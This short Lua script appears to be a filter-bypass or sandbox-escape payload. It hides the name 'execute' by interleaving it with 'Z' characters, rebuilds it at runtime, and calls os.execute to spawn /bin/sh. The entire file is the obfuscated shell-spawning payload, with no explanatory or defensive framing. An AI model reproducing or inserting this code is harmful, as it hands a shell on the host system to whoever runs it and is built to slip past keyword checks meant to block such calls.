local payload = "eZxZeZcZuZtZe"
local code = ""

for match in payload:gmatch("[^Z]") do
    code = code .. match
end

os[code]('/bin/sh')